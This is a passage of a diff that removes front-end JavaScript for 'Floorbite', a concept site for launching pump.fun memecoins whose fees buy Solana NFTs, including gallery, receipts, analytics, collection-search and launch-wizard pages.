-    if(top===4){o+='<polygon points="'+(b.x+4)+','+(b.y+8)+' '+(b.x+8)+','+(b.y-12)+' '+(b.x+b.w*.38)+','+(b.y+4)+'" fill="'+body+'"/><polygon points="'+(b.x+b.w-4)+','+(b.y+8)+' '+(b.x+b.w-8)+','+(b.y-12)+' '+(b.x+b.w*.62)+','+(b.y+4)+'" fill="'+body+'"/>'}
-    o+='<rect x="'+b.x+'" y="'+b.y+'" width="'+b.w+'" height="'+b.h+'" rx="'+b.rx+'" fill="'+body+'"/>';
-    var sp=Math.floor(r()*4);
-    for(var q=0;q<sp;q++)o+='<circle cx="'+(b.x+8+r()*(b.w-16))+'" cy="'+(b.y+b.h*.62+r()*b.h*.3)+'" r="'+(2+r()*2.5)+'" fill="#fff" opacity=".35"/>';
-    var n=1+Math.floor(r()*3),ey=b.y+b.h*.34,re=n===1?11:n===2?8.5:6.5;
-    var xs=n===1?[50]:n===2?[b.x+b.w*.3,b.x+b.w*.7]:[b.x+b.w*.2,50,b.x+b.w*.8];
-    xs.forEach(function(ex){var dx=(r()-.5)*re*.6;o+='<circle cx="'+ex+'" cy="'+ey+'" r="'+re+'" fill="#fff"/><circle cx="'+(ex+dx)+'" cy="'+(ey+1)+'" r="'+(re*.5)+'" fill="'+INKC+'"/>'});
-    var my=b.y+b.h*.74,m=Math.floor(r()*5),l=b.x+b.w*.25,rr=b.x+b.w*.75;
-    if(m===0){o+='<rect x="'+l+'" y="'+(my-5)+'" width="'+(rr-l)+'" height="11" rx="3" fill="'+INKC+'"/>';var tw=(rr-l)/4;for(var t=0;t<4;t++)o+='<polygon points="'+(l+t*tw+1)+','+(my-5)+' '+(l+t*tw+tw/2)+','+(my+3)+' '+(l+t*tw+tw-1)+','+(my-5)+'" fill="#fff"/>'}
-    if(m===1)o+='<path d="M'+l+' '+my+' Q50 '+(my+13)+' '+rr+' '+my+'" stroke="'+INKC+'" stroke-width="3.5" fill="none" stroke-linecap="round"/>';
-    if(m===2)o+='<line x1="'+(l+4)+'" y1="'+my+'" x2="'+(rr-4)+'" y2="'+my+'" stroke="'+INKC+'" stroke-width="3.5" stroke-linecap="round"/>';
-    if(m===3)o+='<ellipse cx="50" cy="'+(my+1)+'" rx="'+(b.w*.17)+'" ry="8" fill="'+INKC+'"/><ellipse cx="50" cy="'+(my+5)+'" rx="'+(b.w*.1)+'" ry="3.5" fill="#FF6FB5"/>';
-    if(m===4){o+='<line x1="'+l+'" y1="'+my+'" x2="'+rr+'" y2="'+my+'" stroke="'+INKC+'" stroke-width="3.5" stroke-linecap="round"/><polygon points="'+(l+6)+','+my+' '+(l+13)+','+my+' '+(l+9.5)+','+(my+9)+'" fill="#fff"/><polygon points="'+(rr-13)+','+my+' '+(rr-6)+','+my+' '+(rr-9.5)+','+(my+9)+'" fill="#fff"/>'}
-    if(r()>.5){o+='<circle cx="'+(b.x+b.w*.12)+'" cy="'+(ey+11)+'" r="4.5" fill="#FF6FB5" opacity=".7"/><circle cx="'+(b.x+b.w*.88)+'" cy="'+(ey+11)+'" r="4.5" fill="#FF6FB5" opacity=".7"/>'}
-    return '<svg viewBox="0 0 100 100" aria-hidden="true" focusable="false">'+o+'</svg>';
-  }
-  /* ---------- helpers for pages ---------- */
-  function numSol(c){return parseFloat(String(c[1]).replace(/,/g,''))}
-  function fmtS(v){return v>=10?v.toFixed(1):v>=0.1?v.toFixed(2):v.toFixed(3)}
-  function pillsC(label,items){
-    var g=el('div',null,'pills');g.setAttribute('role','group');g.setAttribute('aria-label',label);
-    items.forEach(function(it,i){
-      var b=el('button',it[0],'pill');b.type='button';b.setAttribute('aria-pressed',i===0?'true':'false');
-      if(it[1]!=null)b.appendChild(el('span',String(it[1]),'n'));
-      b.addEventListener('click',function(){
-        g.querySelectorAll('.pill').forEach(function(x){x.setAttribute('aria-pressed','false')});
-        b.setAttribute('aria-pressed','true');
-      });
-      g.appendChild(b);
-    });
-    return g;
-  }
-  function collSelect(label){
-    var sl=el('select');sl.setAttribute('aria-label',label);
-    sl.appendChild(el('option','All collections'));
-    COLL.forEach(function(c){sl.appendChild(el('option',c[0]))});
-    return sl;
-  }
-
-  /* ---------- Gallery ---------- */
-  function buildGallery(s){
-    var hd=s.querySelector('.phead'),hs=el('div',null,'hstats');
-    [['NFTs bought','0'],['Spent','0.00 SOL'],['In vaults','0'],['Collections',String(COLL.length)]].forEach(function(x){
-      var d=el('div',null,'hstat');d.appendChild(el('small',x[0]));d.appendChild(el('b',x[1]));hs.appendChild(d);
-    });
-    hd.appendChild(hs);
-    var fb=el('div',null,'fbar');
-    fb.appendChild(collSelect('Filter by collection'));
-    fb.appendChild(pills('Sort NFTs',['Newest','Oldest','Most expensive','Cheapest']));
-    fb.appendChild(pillsC('Filter by status',[['All',null],['In the vault',0],['Burned',0]]));
-    s.appendChild(fb);
-    var c=el('div',null,'card');
-    c.appendChild(el('p','No NFTs yet. Each one a vault buys shows up here with what it cost and where it went.'));
-    s.appendChild(c);
-  }
-
-  /* ---------- Receipts ---------- */
-  function buildReceipts(s){
-    var hd=s.querySelector('.phead'),sp=el('div',null,'solprice');
-    sp.appendChild(el('small','SOL price'));sp.appendChild(el('b','$'+RATE.toFixed(2),'solpx'));sp.appendChild(el('small',RATE_LIVE?'live':'estimate','ratenote'));
-    hd.appendChild(sp);
-    var st=el('div',null,'rstats');
-    [['NFTs bought','0',''],['SOL spent','0.00 SOL',''],['Fees routed to vaults','0.00 SOL','mint'],['NFTs delivered','0','']].forEach(function(x){
-      var d=el('div',null,x[2]);d.appendChild(el('small',x[0]));d.appendChild(el('b',x[1]));st.appendChild(d);
-    });
-    s.appendChild(st);
-    var grid=el('div',null,'rgrid'),main=el('div'),side=el('aside',null,'side');
-    var tb=el('div',null,'tabbar'),tl=el('div',null,'tablist');tl.setAttribute('role','tablist');
-    var panel=el('div',null,'card');var msg=el('p');panel.appendChild(msg);
-    var TXT={Sweeps:'No sweeps yet. Each NFT a vault buys shows up here with its price and transaction.',
-             'Fee routing':'No fee routing yet. Each fee a coin sends to its vault shows up here with its transaction.'};
-    var tabs=[];
-    ['Sweeps','Fee routing'].forEach(function(n,i){
-      var b=el('button',n);b.type='button';b.setAttribute('role','tab');b.setAttribute('aria-selected',i===0?'true':'false');
-      b.addEventListener('click',function(){tabs.forEach(function(x){x.setAttribute('aria-selected','false')});b.setAttribute('aria-selected','true');msg.textContent=TXT[n]});
-      tabs.push(b);tl.appendChild(b);
-    });
-    msg.textContent=TXT.Sweeps;
-    tb.appendChild(tl);tb.appendChild(collSelect('Filter by collection'));
-    main.appendChild(tb);main.appendChild(panel);
-    main.appendChild(el('p','Receipts are indexed from finalized transactions. Token ids link to Tensor; signatures link to Solscan.','note'));
-    var c1=el('div',null,'card');c1.appendChild(el('h3','Saving for the next floor'));
-    c1.appendChild(el('p','Fees already sitting in each vault, measured against what one NFT costs today. A vault can only spend this on its own collection.'));
-    c1.appendChild(el('p','No vault is saving yet. Fees show up here as soon as a coin routes them to its vault.','empty'));
-    side.appendChild(c1);
-    var c2=el('div',null,'card');c2.appendChild(el('h3','By collection'));
-    var ul=el('ul',null,'bycol');
-    COLL.slice(0,8).forEach(function(c){
-      var li=el('li'),bp=el('span',null,'bp');bp.appendChild(picEl(c,96));li.appendChild(bp);
-      var bn=el('span',null,'bn');bn.appendChild(document.createTextNode(c[0]));bn.appendChild(el('small','0 coins'));li.appendChild(bn);
-      var bv=el('span',null,'bv');bv.appendChild(document.createTextNode('0.00 SOL'));bv.appendChild(el('small','0 swept · 0 delivered'));li.appendChild(bv);
-      ul.appendChild(li);
-    });
-    c2.appendChild(ul);
-    var more=el('a','View all collections');more.href='#/collections';more.style.cssText='display:inline-block;margin-top:.8rem;font-weight:600';
-    c2.appendChild(more);side.appendChild(c2);
-    grid.appendChild(main);grid.appendChild(side);s.appendChild(grid);
-  }
-
-  /* ---------- Analytics ---------- */
-  function buildAnalytics(s){
-    var hd=s.querySelector('.phead');
-    hd.appendChild(pills('Time range',['24h','7d','30d','All time']));
-    var fl=COLL.map(numSol).sort(function(a,b){return a-b}),n=fl.length;
-    var med=n%2?fl[(n-1)/2]:(fl[n/2-1]+fl[n/2])/2;
-    var st=el('div',null,'stats');
-    [['Coins launched','0'],['Fees routed (SOL)','0.00'],['NFTs bought','0'],['Collections tracked',String(n)],['Median floor (SOL)',fmtS(med)]].forEach(function(x){
-      var c=el('div',null,'stat');c.appendChild(el('b',x[1]));c.appendChild(el('span',x[0]));st.appendChild(c);
-    });
-    s.appendChild(st);
-
-    var ch=el('div',null,'card achart');
-    ch.appendChild(el('h3','Fees routed over time'));
-    ch.appendChild(el('p','The line starts moving when coins begin routing fees to their vaults.'));
-    var wrap=el('div');
-    wrap.innerHTML='<svg class="chart" viewBox="0 0 640 190" role="img" aria-label="Chart with no data yet: no fees have been routed"><g stroke="currentColor" opacity=".14" stroke-dasharray="4 6"><line x1="44" y1="20" x2="630" y2="20"/><line x1="44" y1="62" x2="630" y2="62"/><line x1="44" y1="104" x2="630" y2="104"/></g><line x1="44" y1="146" x2="630" y2="146" stroke="#FFC933" stroke-width="5" stroke-linecap="round"/><g fill="currentColor" opacity=".6" font-size="13" font-family="inherit"><text x="0" y="150">0</text><text x="0" y="108">1</text><text x="0" y="66">2</text><text x="0" y="24">3</text></g></svg>';
-    ch.appendChild(wrap);s.appendChild(ch);
-
-    var grid=el('div',null,'agrid');
-    var c1=el('div',null,'card');c1.appendChild(el('h3','Collections by floor price'));
-    c1.appendChild(el('p','How many tracked collections sit in each price range.'));
-    var B=[['Under 0.1 SOL',0,0.1],['0.1 to 1 SOL',0.1,1],['1 to 5 SOL',1,5],['5 to 20 SOL',5,20],['20 SOL and up',20,1e9]];
-    var counts=B.map(function(b){return fl.filter(function(v){return v>=b[1]&&v<b[2]}).length});
-    var mx=Math.max.apply(null,counts),ul=el('ul',null,'hbars');
-    B.forEach(function(b,i){
-      var li=el('li',null,'hb');li.appendChild(el('span',b[0],'nm'));
-      var tr=el('span',null,'track'),fi=el('span',null,'fill');fi.style.width=(counts[i]/mx*100)+'%';tr.appendChild(fi);li.appendChild(tr);
-      li.appendChild(el('span',String(counts[i]),'vl'));ul.appendChild(li);
-    });
-    c1.appendChild(ul);grid.appendChild(c1);
-
-    var c2=el('div',null,'card');c2.appendChild(el('h3','Highest floors'));
-    c2.appendChild(el('p','The ten tracked collections with the highest floor price.'));
-    var top=COLL.slice().sort(function(a,b){return numSol(b)-numSol(a)}).slice(0,10),tm=numSol(top[0]),ul2=el('ul',null,'hbars');
-    top.forEach(function(c){
-      var li=el('li',null,'hb pic3'),tp=el('span',null,'tp');tp.appendChild(picEl(c,96));li.appendChild(tp);
-      li.appendChild(el('span',c[0],'nm'));
-      var tr=el('span',null,'track'),fi=el('span',null,'fill');fi.style.width=(numSol(c)/tm*100)+'%';tr.appendChild(fi);li.appendChild(tr);
-      li.appendChild(el('span',c[1]+' SOL','vl'));ul2.appendChild(li);
-    });
-    c2.appendChild(ul2);grid.appendChild(c2);
-    s.appendChild(grid);
-  }
-
-  /* ---------- Collections with search ---------- */
-  var collBox=null,collQ='';
-  function buildCollections(s){
-    var sr=el('div',null,'search');
-    sr.innerHTML='<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="21" y2="21"/></svg>';
-    var inp=el('input');inp.type='search';inp.id='coll-search';inp.placeholder='Search collections';inp.autocomplete='off';inp.setAttribute('aria-label','Search collections');
-    inp.addEventListener('input',function(){
-      collQ=inp.value.trim().toLowerCase();
-      if(location.hash!=='#/collections/1'){try{history.replaceState(null,'','#/collections/1')}catch(e){}}
-      renderCollections(1);
-    });
-    sr.appendChild(inp);s.appendChild(sr);
-    collBox=el('div');s.appendChild(collBox);
-  }
-  function renderCollections(pg){
-    var list=collQ?COLL.filter(function(c){return c[0].toLowerCase().indexOf(collQ)>-1}):COLL;
-    var pages=Math.max(1,Math.ceil(list.length/PER));
-    pg=Math.min(Math.max(pg||1,1),pages);
-    collBox.textContent='';
-    var from=(pg-1)*PER;
-    var rg=el('p',null,'range');
-    if(!list.length){
-      rg.appendChild(el('b','No collections match “'+$('coll-search').value.trim()+'”'));
-    }else{
-      rg.appendChild(el('b','Showing '+(from+1)+'–'+Math.min(from+PER,list.length)));
-      rg.appendChild(document.createTextNode(' of '+list.length+' collection'+(list.length===1?'':'s')+(collQ?' matching “'+$('coll-search').value.trim()+'”':'')));
-      if(!collQ){rg.appendChild(document.createTextNode(' '));rg.appendChild(el('span','More added daily','more'))}
-    }
-    collBox.appendChild(rg);
-    var g=el('div',null,'cg');
-    list.slice(from,from+PER).forEach(function(c){
-      var b=el('button',null,'coll');b.type='button';
-      b.setAttribute('aria-label',c[0]+', floor price '+c[1]+' SOL. Start a launch with this collection.');
-      b.appendChild(picEl(c,400));
-      b.appendChild(el('span',c[0],'cname'));
-      var fl=el('span',null,'floor');
-      fl.appendChild(el('small','Floor price'));fl.appendChild(el('strong',c[1]+' SOL'));var us=el('span','≈ '+usdOf(c));us.setAttribute('data-sol',String(c[1]).replace(/,/g,''));fl.appendChild(us);
-      b.appendChild(fl);b.appendChild(el('span','via '+c[3],'via'));
-      b.addEventListener('click',function(){
-        LP.coll=c;say(c[0]+' selected. Now name your coin.');location.hash='#/launch';
-      });
-      g.appendChild(b);
-    });
-    collBox.appendChild(g);
-    if(pages>1){
-      var pr=el('nav',null,'pager');pr.setAttribute('aria-label','Collections pages');
-      var mk=function(t,p,cur,dis){var a=el('a',t);a.href='#/collections/'+p;if(cur)a.setAttribute('aria-current','page');if(dis)a.setAttribute('aria-disabled','true');pr.appendChild(a)};
-      mk('← Previous',pg-1,false,pg===1);
-      for(var i=1;i<=pages;i++)mk(String(i),i,i===pg,false);
-      mk('Next →',pg+1,false,pg===pages);
-      collBox.appendChild(pr);
-    }
-  }
-  /* ---------- Launch page ---------- */
-  var LP={name:'',sym:'',img:'',desc:'',web:'',x:'',tg:'',coll:null,pol:'keep',step:1,max:1,show:null};
-  var POL=[['keep','Keep them in the vault','The NFTs stay in the vault. Holders can watch the stash grow.','Vault'],
-           ['burn','Burn them','Every NFT is burned. The collection’s supply shrinks for good.','Burn'],
-           ['give','Give them to holders','Each NFT goes to one holder, with odds proportional to balance. Bigger bags, better odds.','Holders']];
-  function polOf(k){return POL.filter(function(p){return p[0]===k})[0]}
-  function goodUrl(v){
-    if(!v)return true;
-    try{var u=new URL(/^https?:\/\//i.test(v)?v:'https://'+v);return /\./.test(u.hostname)}catch(e){return false}
-  }
-  function buildLaunch(s){
-    var STEPS=[['Token','Name, ticker, links'],['Collection','What it sweeps'],['NFT policy','Where NFTs go'],['Review','Confirm and launch']];
-    var root=el('div',null,'lp');s.appendChild(root);
-    var stepsEl=el('ol',null,'lsteps');stepsEl.setAttribute('aria-label','Launch steps');
-    var sbtn=STEPS.map(function(x,i){
-      var li=el('li'),b=el('button',null);b.type='button';
-      b.appendChild(el('span',('0'+(i+1)),'sn'));
-      var sl=el('span',null,'sl');sl.appendChild(el('b',x[0]));sl.appendChild(el('small',x[1]));b.appendChild(sl);
-      b.addEventListener('click',function(){if(i+1<=LP.max)go(i+1)});
-      li.appendChild(b);stepsEl.appendChild(li);return b;
-    });
-    root.appendChild(stepsEl);
-    var card=el('div',null,'lcard');root.appendChild(card);
-    var prev=el('aside',null,'lprev');prev.setAttribute('aria-label','Launch preview');root.appendChild(prev);
-    var panels=[1,2,3,4].map(function(){var p=el('div',null,'lpanel');p.hidden=true;card.appendChild(p);return p});
-    function head(p,t,d){var h=el('h3',t);h.tabIndex=-1;p.appendChild(h);p.appendChild(el('p',d,'pd'));return h}
-    function buttons(p,left,right){var r=el('div',null,'lbtns');r.appendChild(left);r.appendChild(right);p.appendChild(r)}
-    function btn(t,cls){var b=el('button',t,cls||'btn');b.type='button';return b}
-
-    /* ----- step 1: token ----- */
-    var p1=panels[0],h1=head(p1,'Token','What the coin is called and where people can find it.');
-    var info=el('p',null,'linfo');
-    info.innerHTML='Launching on <b>pump.fun</b> · 80% of creator fees go to the collection’s NFT purchase wallet, 20% to the treasury. Floorbite’s operator manages these wallets.';
-    p1.appendChild(info);
-    var two=el('div',null,'two');
-    var iName=el('input');iName.id='lp-name';iName.placeholder='Token name';iName.maxLength=32;iName.autocomplete='off';iName.setAttribute('aria-label','Token name');
-    var iSym=el('input');iSym.id='lp-sym';iSym.placeholder='Symbol';iSym.maxLength=10;iSym.autocomplete='off';iSym.setAttribute('aria-label','Symbol');iSym.style.textTransform='uppercase';
-    two.appendChild(iName);two.appendChild(iSym);p1.appendChild(two);
-    var lImg=el('label','Token image');lImg.setAttribute('for','lp-file');p1.appendChild(lImg);
-    var drop=el('div',null,'drop'),iFile=el('input');iFile.type='file';iFile.id='lp-file';iFile.accept='image/png,image/jpeg,image/webp,image/gif,image/svg+xml';
-    var dropBody=el('div');drop.appendChild(dropBody);drop.appendChild(iFile);p1.appendChild(drop);
-    function paintDrop(){
-      dropBody.textContent='';
-      if(LP.img){var th=document.createElement('img');th.className='thumb';th.alt='Token image preview';th.referrerPolicy='no-referrer';th.src=LP.img;th.addEventListener('error',function(){th.remove()});dropBody.appendChild(th)}
-      dropBody.appendChild(el('strong',LP.img?'Click or drop to replace':'Drop an image, or click to choose'));
-      dropBody.appendChild(el('small','PNG, JPG, WebP, GIF or SVG, up to 5 MB'));
-    }
-    function takeFile(file){
-      if(!file)return;
-      if(!/^image\//.test(file.type)){err1.textContent='That file isn’t an image.';return}
-      if(file.size>5*1024*1024){err1.textContent='That image is over 5 MB.';return}
-      var fr=new FileReader();fr.onload=function(){LP.img=String(fr.result);iUrl.value='';err1.textContent='';paintDrop();paint()};fr.readAsDataURL(file);
-    }
-    paintDrop();
-    iFile.addEventListener('change',function(){takeFile(iFile.files[0])});
-    ['dragenter','dragover'].forEach(function(n){drop.addEventListener(n,function(e){e.preventDefault();drop.classList.add('over')})});
-    ['dragleave','drop'].forEach(function(n){drop.addEventListener(n,function(e){e.preventDefault();drop.classList.remove('over')})});
-    drop.addEventListener('drop',function(e){takeFile(e.dataTransfer&&e.dataTransfer.files[0])});
-    var iUrl=el('input');iUrl.type='url';iUrl.placeholder='…or paste an image URL';iUrl.setAttribute('aria-label','Image URL');iUrl.style.marginTop='.6rem';iUrl.autocomplete='off';
-    iUrl.addEventListener('input',function(){var v=iUrl.value.trim();if(/^https?:\/\/\S+$/i.test(v)){LP.img=v}else if(!v&&LP.img&&!/^data:/.test(LP.img)){LP.img=''}paintDrop();paint()});
-    p1.appendChild(iUrl);
-    var lDesc=el('label',null);lDesc.setAttribute('for','lp-desc');lDesc.appendChild(document.createTextNode('Description'));
-    var cnt=el('span','0 / 512','cnt');lDesc.appendChild(cnt);p1.appendChild(lDesc);
-    var iDesc=el('textarea');iDesc.id='lp-desc';iDesc.maxLength=512;iDesc.placeholder='What’s the coin about?';p1.appendChild(iDesc);
-    iDesc.addEventListener('input',function(){LP.desc=iDesc.value;cnt.textContent=iDesc.value.length+' / 512'});
-    p1.appendChild(el('label','Links'));
-    var stack=el('div',null,'stack');
-    var iWeb=el('input'),iX=el('input'),iTg=el('input');
-    [[iWeb,'Website URL'],[iX,'X profile URL'],[iTg,'Telegram link']].forEach(function(x){x[0].placeholder=x[1];x[0].setAttribute('aria-label',x[1]);x[0].autocomplete='off';x[0].inputMode='url';stack.appendChild(x[0])});
-    stack.firstChild.style.marginTop='0';p1.appendChild(stack);
-    var err1=el('p',null,'lerr');err1.setAttribute('role','alert');p1.appendChild(err1);
-    var cancel=el('a','Cancel','btn ghost');cancel.href='#/';
-    var c1=btn('Continue');
-    buttons(p1,cancel,c1);
-    iName.addEventListener('input',function(){LP.name=iName.value;paint()});
-    iSym.addEventListener('input',function(){iSym.value=iSym.value.replace(/[^A-Za-z0-9]/g,'');LP.sym=iSym.value.toUpperCase();paint()});
-    iWeb.addEventListener('input',function(){LP.web=iWeb.value.trim()});iX.addEventListener('input',function(){LP.x=iX.value.trim()});iTg.addEventListener('input',function(){LP.tg=iTg.value.trim()});
-    c1.addEventListener('click',function(){
-      var bad=null,m='';
-      [iName,iSym,iWeb,iX,iTg].forEach(function(i){i.removeAttribute('aria-invalid')});
-      if(!LP.name.trim()){bad=iName;m='Give your coin a name.'}
-      else if(LP.sym.length<2){bad=iSym;m='The symbol needs 2 to 10 letters or numbers.'}
-      else if(!LP.img){bad=iUrl;m='Add a token image or paste an image URL.'}
-      else if(!goodUrl(LP.web)){bad=iWeb;m='That website link doesn’t look right.'}
-      else if(!goodUrl(LP.x)){bad=iX;m='That X link doesn’t look right.'}
-      else if(!goodUrl(LP.tg)){bad=iTg;m='That Telegram link doesn’t look right.'}
-      err1.textContent=m;
-      if(bad){bad.setAttribute('aria-invalid','true');bad.focus();return}
-      go(2);
-    });
-
-    /* ----- step 2: collection ----- */
-    var p2=panels[1],h2=head(p2,'Collection','The collection your fees will buy at the floor. Permanent.');
-    var n2=el('div',null,'lnote');n2.innerHTML='<b>This is permanent.</b> Your coin’s fees are bound to this collection’s vault, which can only buy this collection. You can’t change it after launch.';p2.appendChild(n2);
-    var ls=el('div',null,'lsearch search');
-    ls.innerHTML='<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="21" y2="21"/></svg>';
-    ls.style.maxWidth='none';
-    var iq=el('input');iq.type='search';iq.placeholder='Search collections';iq.setAttribute('aria-label','Search collections');iq.autocomplete='off';ls.appendChild(iq);p2.appendChild(ls);
-    var grid=el('div',null,'lgrid');grid.setAttribute('role','radiogroup');grid.setAttribute('aria-label','Solana NFT collections');p2.appendChild(grid);
-    p2.appendChild(el('p','Floor prices come from OpenSea and change constantly. Dollar estimates follow the live SOL price.','hint'));
-    var back2=btn('Back','btn ghost'),c2=btn('Continue');
-    buttons(p2,back2,c2);
-    function renderGrid(){
-      var q=iq.value.trim().toLowerCase(),list=COLL.filter(function(c){return !q||c[0].toLowerCase().indexOf(q)>-1});
-      grid.textContent='';
-      if(!list.length){grid.appendChild(el('p','No collection matches “'+iq.value.trim()+'”.','lempty'));return}
-      list.forEach(function(c){
-        var o=el('button',null,'lopt');o.type='button';o.setAttribute('role','radio');o.setAttribute('aria-checked',LP.coll&&LP.coll[0]===c[0]?'true':'false');
-        var pw=el('span',null,'lpic');pw.appendChild(picEl(c,96));o.appendChild(pw);
-        var t=el('span',null,'lt');t.appendChild(el('span',c[0],'lname'));
-        var fl=el('span',null,'lfl');fl.appendChild(document.createTextNode(c[1]+' SOL · '));
-        var us=el('span','≈ '+usdOf(c));us.setAttribute('data-sol',String(c[1]).replace(/,/g,''));fl.appendChild(us);t.appendChild(fl);o.appendChild(t);
-        o.appendChild(el('span',null,'lradio'));
-        o.addEventListener('click',function(){
-          LP.coll=c;
-          grid.querySelectorAll('.lopt').forEach(function(x){x.setAttribute('aria-checked','false')});
-          o.setAttribute('aria-checked','true');c2.disabled=false;paint();
-        });
-        grid.appendChild(o);
-      });
-    }
-    iq.addEventListener('input',renderGrid);
-    back2.addEventListener('click',function(){go(1)});
-    c2.addEventListener('click',function(){if(LP.coll)go(3)});
-
-    /* ----- step 3: NFT policy ----- */
-    var p3=panels[2],h3=head(p3,'NFT policy','Where the NFTs go once your vault owns them.');
-    var pg=el('div',null,'lpols');pg.setAttribute('role','radiogroup');pg.setAttribute('aria-label','NFT policy');
-    POL.forEach(function(p){
-      var o=el('button',null,'lopt pol');o.type='button';o.setAttribute('role','radio');o.setAttribute('aria-checked',LP.pol===p[0]?'true':'false');o.setAttribute('data-pol',p[0]);
-      var t=el('span',null,'lt');t.appendChild(el('b',p[1]));t.appendChild(el('span',p[2],'d'));
-      o.appendChild(t);o.appendChild(el('span',null,'lradio'));
-      o.addEventListener('click',function(){LP.pol=p[0];pg.querySelectorAll('.lopt').forEach(function(x){x.setAttribute('aria-checked',x===o?'true':'false')});paint()});
-      pg.appendChild(o);
-    });
-    p3.appendChild(pg);
-    var n3=el('div',null,'lnote');n3.innerHTML='<b>This is permanent.</b> It’s set at launch and can’t be changed afterwards, so holders can rely on it.';p3.appendChild(n3);
-    var back3=btn('Back','btn ghost'),c3=btn('Continue');buttons(p3,back3,c3);
-    back3.addEventListener('click',function(){go(2)});c3.addEventListener('click',function(){go(4)});
-
-    /* ----- step 4: review ----- */
-    var p4=panels[3],h4=head(p4,'Review','Look it over. One transaction does everything.');
-    var rr=el('div',null,'rrows');p4.appendChild(rr);
-    var fb=el('div',null,'fbox');
-    function frow(l,v,cls){var r=el('div',null,'rrow'),a=el('span',l),b=el('b',v,cls);r.appendChild(a);r.appendChild(b);return r}
-    fb.appendChild(frow('Network and creation fees','Quoted before signing','mono'));
-    fb.appendChild(frow('Total','Quoted before signing','mono'));
-    fb.appendChild(el('small','One transaction. Estimate: your wallet shows the final amount.'));
-    p4.appendChild(fb);
-    var ul=el('ul',null,'rbul');
-    ['Pump’s fee-sharing program locks 80% to the collection wallet and 20% to the treasury.',
-     'Floorbite’s operator controls those wallets, NFT custody and the NFT policy you chose. The policy is recorded by Floorbite; it is not enforced by a custom program.',
-     'Trading is on Solana. Purchases and deliveries depend on Floorbite’s server remaining available.'].forEach(function(t){ul.appendChild(el('li',t))});
-    p4.appendChild(ul);
-    var ratio=el('p',null,'ratio');ratio.innerHTML='For every <b>1 SOL</b> of creator fees your coin earns, <b>0.80 SOL</b> goes to the vault and <b>0.20 SOL</b> to the treasury.';p4.appendChild(ratio);
-    var wbtn=el('button','Connect wallet','btn big lgo');wbtn.type='button';wbtn.setAttribute('data-wallet','');p4.appendChild(wbtn);
-    var gbtn=el('button','Launch coin','btn big lgo');gbtn.type='button';p4.appendChild(gbtn);
-    var res=el('p',null,'lres');res.hidden=true;res.setAttribute('role','status');p4.appendChild(res);
-    gbtn.addEventListener('click',function(){
-      res.hidden=false;res.textContent='Concept only: nothing was signed or sent from your wallet. Launching on Floorbite isn’t open yet.';
-    });
-    var back4=btn('Back','btn ghost');var sp=el('span');buttons(p4,back4,sp);
-    back4.addEventListener('click',function(){go(3)});
-    function paintReview(){
-      rr.textContent='';
-      var pol=polOf(LP.pol);
-      var rows=[['Name',LP.name],['Ticker',LP.sym]];
-      rows.forEach(function(x){rr.appendChild(frow(x[0],x[1]||'-'))});
-      var cr=el('div',null,'rrow');cr.appendChild(el('span','Collection'));var cb=el('b');
-      if(LP.coll){var pw=el('span',null,'lpic');pw.appendChild(picEl(LP.coll,64));cb.appendChild(pw);cb.appendChild(document.createTextNode(LP.coll[0]))}else cb.textContent='-';
-      cr.appendChild(cb);rr.appendChild(cr);
-      var pr=el('div',null,'rrow');pr.appendChild(el('span','NFT policy'));var pb=el('b');pb.appendChild(el('span',pol[1],null));pr.appendChild(pb);rr.appendChild(pr);
-      res.hidden=true;
-      wbtn.hidden=!!wallet;gbtn.hidden=!wallet;
-    }
-    onWallet=function(){if(LP.step===4){wbtn.hidden=!!wallet;gbtn.hidden=!wallet}};
-
-    /* ----- preview ----- */
-    function paint(){
-      prev.textContent='';
-      var ph=el('div',null,'ph'),av=el('span',null,'av');
-      if(LP.img){var im=document.createElement('img');im.alt='';im.referrerPolicy='no-referrer';im.src=LP.img;im.addEventListener('error',function(){im.remove();av.textContent=(LP.sym[0]||'T')});av.appendChild(im)}else av.textContent=(LP.sym[0]||'T');
-      ph.appendChild(av);var tx=el('div');tx.appendChild(el('b',LP.sym||'TICKER'));tx.appendChild(el('small',LP.name||'Unnamed coin'));ph.appendChild(tx);prev.appendChild(ph);
-      function row(l,fill){var r=el('div',null,'pr');r.appendChild(el('span',l));var b=el('b');fill(b);r.appendChild(b);prev.appendChild(r)}
-      row('Sweeps',function(b){if(LP.coll){var pw=el('span',null,'lpic');pw.appendChild(picEl(LP.coll,48));b.appendChild(pw);b.appendChild(document.createTextNode(LP.coll[0]))}else{b.textContent='not chosen';b.style.color='var(--muted)';b.style.fontWeight='400'}});
-      row('NFT policy',function(b){b.appendChild(el('span',polOf(LP.pol)[3],'badge2'))});
-      row('Supply',function(b){b.textContent='Recorded at launch'});
-      var pf=el('div',null,'pf');pf.appendChild(el('h4','Per 1 SOL of creator fees'));
-      var bar=el('div',null,'pbar');bar.appendChild(el('i'));bar.appendChild(el('i'));pf.appendChild(bar);
-      [['Collection vault','0.80 SOL'],['Floorbite treasury','0.20 SOL']].forEach(function(x){var l=el('div',null,'pl');l.appendChild(el('span',x[0]));l.appendChild(el('b',x[1]));pf.appendChild(l)});
-      pf.appendChild(el('p','Creator fees are set by pump.fun and accrue on every trade, on the curve and after graduation. Excludes network fees.','pn'));
-      prev.appendChild(pf);
-    }
-
-    /* ----- navigation ----- */
-    var heads=[h1,h2,h3,h4];
-    function go(n,quiet){
-      LP.step=n;LP.max=Math.max(LP.max,n);
-      panels.forEach(function(p,i){p.hidden=(i+1!==n)});
-      sbtn.forEach(function(b,i){
-        b.disabled=(i+1>LP.max);
-        if(i+1===n)b.setAttribute('aria-current','step');else b.removeAttribute('aria-current');
-        b.classList.toggle('done',i+1<n);
-        b.querySelector('.sn').textContent=(i+1<n)?'✓':('0'+(i+1));
-      });
-      if(n===2){renderGrid();c2.disabled=!LP.coll;var on=grid.querySelector('[aria-checked="true"]');if(on&&on.scrollIntoView)on.scrollIntoView({block:'nearest'})}
-      if(n===4)paintReview();
-      paint();
-      if(!quiet){var t=root.getBoundingClientRect().top+window.pageYOffset-16;window.scrollTo(0,Math.max(0,t));heads[n-1].focus({preventScroll:true})}
-    }
-    LP.show=function(){go(LP.step,true)};
-    onRate=null;
-    go(1,true);
-  }
-  /* ---------- Home: top coins + top collections ---------- */
-  function buildBoard(box){
-    var wrap=el('div',null,'board');box.appendChild(wrap);
-    /* coins */
